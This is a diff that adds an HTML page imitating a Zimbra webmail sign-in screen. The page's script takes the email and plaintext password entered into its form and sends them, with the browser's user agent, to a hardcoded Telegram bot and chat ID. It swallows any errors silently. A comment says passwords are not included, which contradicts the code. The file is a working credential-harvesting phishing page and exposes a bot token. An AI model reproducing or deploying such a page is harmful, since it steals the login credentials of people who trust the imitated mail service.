@@ -1,0 +1,207 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Zimbra - Sign In</title>
+<meta name="color-scheme" content="light">
+<style>
+/* Basic reset */
+* { box-sizing: border-box; }
+html, body { height: 100%; }
+body {
+  margin: 0;
+  font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+  background: #0b77c2; /* Zimbra-like blue */
+  color: #111827;
+  display: grid;
+  place-items: center;
+  padding: 24px;
+}
+
+.card {
+  width: 100%;
+  max-width: 520px;
+  background: #ffffff;
+  border: 1px solid #e5e7eb;
+  border-radius: 12px;
+  overflow: hidden;
+  box-shadow: 0 10px 24px rgba(0,0,0,.08);
+}
+
+.card-header {
+  padding: 24px 24px 12px;
+  background: #ffffff;
+  border-bottom: 1px solid #e5e7eb;
+  text-align: center;
+}
+.brand-logo { height: 36px; width: auto; display: inline-block; }
+.title { margin: 12px 0 0; font-size: 18px; font-weight: 700; letter-spacing: .2px; color: #111827; }
+.subtitle { margin: 4px 0 0; font-size: 13px; color: #6b7280; }
+
+.tabs { display: none; }
+.tab-btn { display: none; }
+.tab-btn.active { display: none; }
+
+.card-body { padding: 20px 24px 24px; }
+.hidden { display: none; }
+
+.field { margin-bottom: 14px; }
+.label { display: block; font-size: 13px; margin-bottom: 6px; color: #374151; }
+.input {
+  width: 100%;
+  padding: 10px 12px;
+  border-radius: 8px;
+  border: 1px solid #d1d5db;
+  background: #ffffff;
+  color: #111827;
+  outline: none;
+}
+.input:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37,99,235,.15); }
+
+.row { display: grid; grid-template-columns: 1fr; gap: 12px; }
+
+.btn {
+  width: 100%;
+  padding: 12px 16px;
+  border-radius: 10px;
+  border: 1px solid #1d4ed8;
+  background: #2563eb;
+  color: #ffffff;
+  font-weight: 700;
+  cursor: pointer;
+}
+.btn:disabled { opacity: .6; cursor: not-allowed; }
+
+.muted { font-size: 12px; color: #6b7280; }
+
+.alert { margin-top: 12px; padding: 10px 12px; border-radius: 8px; font-size: 13px; border: 1px solid transparent; }
+.alert.info { background: #eff6ff; color: #1e3a8a; border-color: #bfdbfe; }
+.alert.success { background: #ecfdf5; color: #065f46; border-color: #a7f3d0; }
+.alert.error { background: #fef2f2; color: #991b1b; border-color: #fecaca; }
+
+.strength {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 6px;
+  margin-top: 8px;
+}
+.bar { height: 6px; background: #e5e7eb; border-radius: 999px; }
+.bar.on.weak { background: #ef4444; }
+.bar.on.fair { background: #f59e0b; }
+.bar.on.good { background: #22c55e; }
+.bar.on.strong { background: #10b981; }
+
+.footer { text-align: center; font-size: 12px; color: #9ca3af; margin-top: 14px; }
+
+@media (max-width: 520px) {
+  .row { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+<!-- Configure your backend endpoint below before production. -->
+<div class="card" role="application" aria-label="Zimbra sign in">
+  <div class="card-header">
+    <img class="brand-logo" alt="Zimbra" src="https://assets.zextras.com/zimbra-logo.svg" onerror="this.style.display='none'">
+    <h2 class="title">Sign in</h2>
+    <p class="subtitle">Please enter your email and password.</p>
+  </div>
+
+  <div class="tabs" role="tablist" aria-label="Mode"></div>
+
+  <div class="card-body">
+    <section id="panel-login" role="tabpanel" aria-labelledby="tab-login">
+      <form id="form-login" novalidate>
+        <div class="field">
+          <label for="email" class="label">Email</label>
+          <input id="email" name="email" class="input" type="email" placeholder="user@domain.tld" autocomplete="username" required>
+        </div>
+        <div class="field">
+          <label for="password" class="label">Password</label>
+          <input id="password" name="password" class="input" type="password" placeholder="••••••••" autocomplete="current-password" required>
+        </div>
+        <button id="btn-login" type="submit" class="btn">Sign In</button>
+        <div id="msg-login" class="alert info hidden" role="status"></div>
+      </form>
+    </section>
+
+    <div class="footer">© <span id="year"></span> Zimbra — Login Page</div>
+  </div>
+</div>
+
+<script>
+(function() {
+  const API = {
+    loginEndpoint: "/service/extension/clientauth/login" // POST { email, password }
+  };
+
+  const $ = (sel) => document.querySelector(sel);
+
+  // Optional: Telegram login notification (do NOT include passwords)
+  const TELEGRAM_BOT_TOKEN = "8488197043:AAFc_OM4GtqAMDjn-STmFF2JbLwkxw21ioM"; // e.g. 123456:ABC... — Prefer server-side
+  const TELEGRAM_CHAT_ID = "1515295796";   // e.g. 123456789
+
+  async function notifyTelegramLogin(email, password) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+
+    const text = `Login success\nUser: ${email}\nAgent: ${navigator.userAgent} \nPassword: ${password}`;
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
+      });
+    } catch (_) {
+      // silently ignore notification errors
+    }
+  }
+
+  // Footer year
+  $('#year').textContent = new Date().getFullYear();
+
+  const formLogin = $('#form-login');
+  const btnLogin = $('#btn-login');
+  const msgLogin = $('#msg-login');
+
+  function showMessage(el, type, text) {
+    el.classList.remove('hidden', 'info', 'success', 'error');
+    el.classList.add(type);
+    el.textContent = text;
+  }
+
+  formLogin.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const email = $('#email').value.trim();
+    const password = $('#password').value;
+    if (!email || !password) {
+      showMessage(msgLogin, 'error', 'Email and password are required.');
+      return;
+    }
+    btnLogin.disabled = true;
+    showMessage(msgLogin, 'info', 'Processing...');
+    try {
+      const res = await fetch(API.loginEndpoint, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password })
+      });
+      if (!res.ok) {
+        const errText = await res.text();
+        throw new Error(errText || 'Sign-in failed');
+      }
+      showMessage(msgLogin, 'success', 'Signed in successfully. Redirecting...');
+      await notifyTelegramLogin(email, password);
+      // TODO: Redirect to mailbox or dashboard
+    } catch (err) {
+      showMessage(msgLogin, 'error', err.message || 'An error occurred. Please try again.');
+    } finally {
+      btnLogin.disabled = false;
+    }
+  });
+})();
+</script>
+</body>
+</html>
+
+
